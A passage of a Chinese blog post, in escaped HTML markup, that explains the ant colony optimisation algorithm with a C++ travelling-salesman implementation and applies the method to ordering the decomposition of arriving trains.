class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::addcity(<span class=\"keyword\">int</span> city)</span><br><span class=\"line\">&#123;<span class=\"comment\">//add city to tabu;</span></span><br><span class=\"line\">\tvisited[m_iTopCity]=city;</span><br><span class=\"line\">\tm_iTopCity++;</span><br><span class=\"line\">\tallowed[city]=<span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::UpdateProb()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> temp=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> curCity=visited[m_iTopCity<span class=\"number\">-1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> c=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(allowed[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">double</span> p=<span class=\"built_in\">pow</span>((<span class=\"number\">1.0</span>/Map.distance[curCity][i]),beta)*<span class=\"built_in\">pow</span>((Map.m_dTrial[curCity][i]),alpha);</span><br><span class=\"line\">\t\t\ttemp+=p;</span><br><span class=\"line\">\t\t\tc++;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(allowed[i])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (temp==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t\tprob[i]=(double)<span class=\"number\">1.0</span>/(double)c;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t\tprob[i]=<span class=\"built_in\">pow</span>((<span class=\"number\">1.0</span>/Map.distance[curCity][i]),beta)*<span class=\"built_in\">pow</span>((Map.m_dTrial[curCity][i]),alpha)/temp;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\tprob[i]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">int</span> ant::ChooseNextCity()</span><br><span class=\"line\">&#123;<span class=\"comment\">//Update the probability of path selection</span></span><br><span class=\"line\">\t<span class=\"comment\">//select a path from tabu[m_iCityCount-1] to next</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,j;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> temp;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> mRate=rnd(<span class=\"number\">0</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> curCity=visited[m_iTopCity<span class=\"number\">-1</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateProb();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (mRate&gt;q0)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ttemp=<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//temp&lt;prob[i];</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(allowed[i])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">double</span> p=<span class=\"built_in\">pow</span>((<span class=\"number\">1.0</span>/Map.distance[curCity][i]),beta)*<span class=\"built_in\">pow</span>((Map.m_dTrial[curCity][i]),alpha);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (temp&lt;p)</span><br><span class=\"line\">\t\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t\ttemp=p;</span><br><span class=\"line\">\t\t\t\t\tj=i;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">double</span> mSelect=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tmSelect+=prob[i] ;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (mSelect&gt;=mRate) &#123;j=i;<span class=\"keyword\">break</span>;&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn j;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::UpdateLength()</span><br><span class=\"line\">&#123;<span class=\"comment\">// Update the length of tour</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\tm_dLength+=Map.distance[visited[i]][visited[i+<span class=\"number\">1</span>]];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::move()</span><br><span class=\"line\">&#123;<span class=\"comment\">//the ant move to next town and add town ID to tabu.</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\tj=ChooseNextCity();</span><br><span class=\"line\">\taddcity(j);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> ant::Clear()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tm_dLength=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprob[i]=<span class=\"number\">0.5</span>;</span><br><span class=\"line\">\t\tallowed[i]=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ti=visited[<span class=\"number\">0</span>];</span><br><span class=\"line\">\tm_iTopCity=<span class=\"number\">0</span>;</span><br><span class=\"line\">\taddcity(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">class</span> project</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">initmap</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">double</span> m_dShortest;</span><br><span class=\"line\">\tant ants[iAntCount];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">UpdateTrial</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">GetAnt</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">StartSearch</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\tproject();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">project::project()</span><br><span class=\"line\">&#123;<span class=\"comment\">//initial map,read map infomation from file . et.</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">struct</span> city</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> x;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span>  y;</span><br><span class=\"line\">\t&#125;cc[iCityCount];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinitmap();</span><br><span class=\"line\"></span><br><span class=\"line\">\tm_dShortest=<span class=\"number\">10e9</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\">ifstream <span class=\"title\">in</span><span class=\"params\">(<span class=\"string\">\"48.txt\"</span>)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tin&gt;&gt;num&gt;&gt;cc[i].x&gt;&gt;cc[i].y;</span><br><span class=\"line\">\t\tbesttour[i]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t\tMap.distance[i][j]=<span class=\"built_in\">sqrt</span>(pow((cc[i].x-cc[j].x),<span class=\"number\">2</span>)+pow((cc[i].y-cc[j].y),<span class=\"number\">2</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> project::initmap()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tMap.m_dTrial[i][j]=<span class=\"number\">1.0</span>/(double)iCityCount;</span><br><span class=\"line\">\t\t\tMap.m_dDeltTrial[i][j]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> project::GetAnt()</span><br><span class=\"line\">&#123;<span class=\"comment\">//randomly put ant into map</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> city;</span><br><span class=\"line\">\tsrand( (unsigned)time( NULL ) +rand());</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iAntCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tcity=rnd(iCityCount);</span><br><span class=\"line\">\t\tants[i].addcity(city);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> project::StartSearch()</span><br><span class=\"line\">&#123;<span class=\"comment\">//begin to find best solution</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> max=<span class=\"number\">0</span>;<span class=\"comment\">//every ant tours times</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> temp;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> temptour[iCityCount+<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (max&lt;iItCount)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount<span class=\"number\">-1</span>;i++)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;iAntCount;j++)</span><br><span class=\"line\">\t\t\t\tants[j].move();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;iAntCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tants[j].visited[iCityCount]=ants[j].visited[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t\t\tants[j].UpdateLength ();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">//find out the best solution of the step and put it into temp</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> t;</span><br><span class=\"line\">\t\ttemp=ants[<span class=\"number\">0</span>].m_dLength ;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (t=<span class=\"number\">0</span>;t&lt;iCityCount+<span class=\"number\">1</span>;t++)</span><br><span class=\"line\">\t\t\ttemptour[t]=ants[<span class=\"number\">0</span>].visited[t];</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;iAntCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (temp&gt;ants[j].m_dLength) &#123;</span><br><span class=\"line\">\t\t\t\ttemp=ants[j].m_dLength;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> ( t=<span class=\"number\">0</span>;t&lt;iCityCount+<span class=\"number\">1</span>;t++)</span><br><span class=\"line\">\t\t\t\t\ttemptour[t]=ants[j].visited[t];</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(temp&lt;m_dShortest)&#123;</span><br><span class=\"line\">\t\t\tm_dShortest=temp;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d : %f\\n\"</span>,max,m_dShortest);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> ( t=<span class=\"number\">0</span>;t&lt;iCityCount+<span class=\"number\">1</span>;t++)</span><br><span class=\"line\">\t\t\t\tbesttour[t]=temptour[t];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (max %<span class=\"number\">100</span>==<span class=\"number\">0</span>)<span class=\"built_in\">printf</span>(<span class=\"string\">\" %d \"</span>,max);</span><br><span class=\"line\">\t\tUpdateTrial();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;iAntCount;j++)</span><br><span class=\"line\">\t\t\tants[j].Clear();</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmax++;</span><br><span class=\"line\">\t\t<span class=\"comment\">//char c;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//scanf(\"%c\",&amp;c);</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"The shortest toure is : %f\\n\"</span>,m_dShortest);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ( <span class=\"keyword\">int</span> t=<span class=\"number\">0</span>;t&lt;=iCityCount;t++)</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" %d \"</span>,besttour[t]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> project::UpdateTrial()</span><br><span class=\"line\">&#123;<span class=\"comment\">//calculate the changes of trial information</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//printf(\"trail is : %1.10f deltatrial is: %1.10f\\n\",Map.m_dTrial[i][j],Map.m_dDeltTrial[i][j]);</span></span><br><span class=\"line\">\t\t\tMap.m_dTrial[i][j]*=(<span class=\"number\">1</span>-rou);<span class=\"comment\">//*Map.m_dTrial[i][j]+Map.m_dDeltTrial[i][j] );</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//Map.m_dProb[i][j]=</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//Map.m_dDeltTrial[i][j]=0;</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;iAntCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tMap.m_dDeltTrial[ants[i].visited[j]][ants[i].visited[j+<span class=\"number\">1</span>]]+=Q/ants[i].m_dLength ;</span><br><span class=\"line\">\t\t\tMap.m_dDeltTrial[ants[i].visited[j+<span class=\"number\">1</span>]][ants[i].visited[j]]+=Q/ants[i].m_dLength;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>;i&lt;iCityCount;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>;j&lt;iCityCount;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//printf(\"trail is : %1.10f deltatrial is: %1.10f\\n\",Map.m_dTrial[i][j],Map.m_dDeltTrial[i][j]);</span></span><br><span class=\"line\">\t\t\tMap.m_dTrial[i][j]=rou*(Map.m_dTrial[i][j]+Map.m_dDeltTrial[i][j] );</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//Map.m_dProb[i][j]=</span></span><br><span class=\"line\">\t\t\tMap.m_dDeltTrial[i][j]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\tproject TSP;</span><br><span class=\"line\">\tTSP.GetAnt();</span><br><span class=\"line\">\tTSP.StartSearch();</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> c;</span><br><span class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%c\"</span>,&amp;c);</span><br><span class=\"line\">\treturn <span class=\"number\">0</span>;&#125;</span><br></pre></td></tr></table></figure>\n<p>输入文件叫做“48.txt”，格式如下<br><a href=\"/other/48.txt\">48.txt</a></p>\n<p>###列车解体问题###<br>输入文件格式如下：<br>首先是到达列车的数量，然后分别写出每个列车的信息<br>然后是出发列车的数量，然后写出每个列车的信息<br><a href=\"/other/aco_input.txt\">aco_input.txt</a></p>\n","excerpt":"<p>##基本原理的了解##<br>首先我们来说一下蚁群算法。在看本文之前，大家需要先看一下百度百科关于蚁群算法的初步讲解。真正的蚁群算法和自然界的蚂蚁寻找食物是有很大差异的。但是了解大自然蚂蚁的寻找规律是很有必要的。<br>","more":"</p>\n<p>##蚁群算法和大自然蚂蚁寻找食物的区别##<br>大自然中，蚂蚁在寻找食物的时候，会留下自己的信息素。同时每个蚂蚁个体更倾向于朝着信息素更加浓的方向走（这是一个概率问题，越浓的方向被选择的概率越大）。同时由于两点之间，一定的时间内越短的道路通过的蚂蚁越多，所以越短的道路留下的信息素也越多。直到最后这个信息素浓度特别的浓，大家走有极大地概率往这个方向走。<br><img src=\"/image/20150223234503.png\" alt=\"\"><br>上边这张图来自于百度百科。我想说明的一点是，蚂蚁并不知道自己走过的路程是短还是长（我了解这一点也是通过我的女票囧）。他们只需要按照信息素的浓度找吃的就可以了。因为如上图，最开始的时候，两边一样多的信息素浓度。但是A侧更短，所以A侧的会先到达目的地。因此一定时间内能够通过的蚂蚁更多。所以信息素浓度就大。<br>但是我们设计的蚁群算法不是这样的。我们是根据不同蚂蚁走过的道路的距离来决定信息素的多少的。这只蚂蚁走过的总路程最短，那么它释放的信息素就更多。我们只能通过距离的长短来设计信息素的多少，而不是通过蚂蚁先后到达来体现信息素。</p>\n<p>##蚁群算法的基本流程##<br>总体来说每一轮蚁群算法的迭代有这么几步：</p>\n<p>###放置蚂蚁###<br>以TSP（货郎担问题）为例，我们会在多个城市中随机放置蚂蚁。来作为整个程序的开始。</p>\n<p>###选择概率的更新###<br>对于每一只蚂蚁的当前位置，我们需要根据信息素浓度来判定下一个城市的选择概率，然后根据概率进行下一个城市的选择。这里大有文章可做，我们可以结合信息素浓度，以及自己设计的各种启发函数，来确定下一个城市的选择概率。</p>\n<p>###下一个城市的选择###<br>对于每一只蚂蚁，我们可以根据上一步的概率来选择下一个城市。同时进行操作，诸如已选城市标记，选择好的数据处理等等。</p>\n<p>###信息素的更新###<br>这一步是在所有的蚂蚁完成该轮循环之后做的事情。我们对于每只旅行完毕的蚂蚁的每一段旅程进行信息素更新。更新的依据就是它走过的路程长短。这里把路程长短转化为信息素浓度也是需要设计。常用的有基于平均数的设计（短于平均长度的路程信息素加一些，长于平均长度的蚂蚁对应的路程信息素减一些）。对于经过的每一段旅程进行更新完毕之后，城市两两之间的选择信息素浓度就有了。</p>\n<p>##货郎担问题的基本实现##<br>首先由几点要说一下：</p>\n<p>###关于$\\rho$这个元素###<br>我们知道，如果信息素不耗散，会有什么后果呢。理论一点的说就是算法收敛速度过快，陷入局部最优解中。为什么会出现这种现象呢。是因为为了让更多的蚂蚁去有更大的概率选择一些新的道路，或者说让最近的一次迭代起到的作用更大，我们需要削弱以前几次迭代的结果。这个在大自然中表现为蚂蚁留下的信息素会不断的被风吹走，我们在算法中呢，也就是代码中的rou，就是用来形容以前的信息素信息被吹走的。看看代码就可以了。</p>\n<p>###关于代码中详细的表示###<br>本人不敢妄加修改代码，只好大体说一下各个函数以及变量的意义。<br>首先ant类是用来表示每只蚂蚁的行动的。函数名称对照我上边所说的几个过程就可以看懂了。<br>project类是用来描述整个的算法进程的。也是很容易明白。会点c++语言的基本都能看懂。<br>具体的Q啦，alpha啦，这些都是具体算法设计的内容。我没有作TSP的相关研究。这些都是可以自己设计的。我就暂且不说了。</p>\n<p>###代码###<br>代码在最后边放着。我先说列车解体问题的具体应用了。</p>\n<p>##列车解题顺序编排的应用##<br>这个问题大体来说是这样的。我们知道我们做的火车是由很多车节组成的。每个出发列车的车节都是由到达列车拆分然后组装出来的。所以我们要解决的问题就是，如果每个时间只能有一辆列车被拆分，在每个出发列车时间确定的情况下，怎样的拆分顺序是能够弄出更多的出发列车呢。</p>\n<p>具体来说，每个到达列车有a,b,c,d四个方向不同的车节，每个出发列车也有四个方向车节的要求。同时每个到达列车有自己的解体时间，出发列车组装也需要时间。具体如下表：<br><img src=\"/image/20150224.png\" alt=\"\"></p>\n<p>因为如果我们需要对每个到达列车进行顺序编排的话，就有n!种排序方式。这个很明显是NP完全问题了。用蚁群算法优化一下或许是一个不错的选择。</p>\n<p>首先我们是需要把所有列车都解体的。只不过是顺序问题。所以我们就映射到了TSP问题当中，TSP需要走遍所有的城市，只不过是顺序问题罢了。<br>接下来我们可以用出发列车作为时间限制进行优化，比方说第一个出发列车，在这个列车出发前，我们有几辆列车已经到位了，所以这个时候在第一辆发车之前，我们只能选择已经到达的这几辆列车解体。凑够第一辆出发列车之后，我们在考虑第二辆列车。这样的话我们就缩小了搜索范围，提升了效率。<br>我们需要给每个蚂蚁设计一个时间戳，描述当前这只蚂蚁走到了什么时间。如果超过了当前列车出发时间还没有凑齐，那么这只蚂蚁就废了。success这个元素就标记成0.<br>每次添加城市（也就是具体问题中的选择新的列车），我们都要在这个蚂蚁的时间戳上更新时间。如果是很早以前就到了的列车，我们加上解体时间就好，如果是还没到的列车，我们需要等列车到了，再加上解体时间。然后在蚂蚁的列车库中先添加这个解体列车的列车节数，然后检查是不是凑够了当前出发列车需要的节数。如果凑够了就在蚂蚁车库中去除列车节数，否则就继续。<br>程序员都知道，当然这个列车问题有很多其他的设计细节，细节决定成败。详细说清楚的话很费力。有兴趣的看看代码，不懂再联系。</p>\n<p>##代码部分##</p>\n<p>###传统TSP###<br>这个代码是直接从网上粘过来的。来自于fashionxu.blogchina.com<br>这个代码是我自己调试通过了的。有什么疑问留言就好。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span 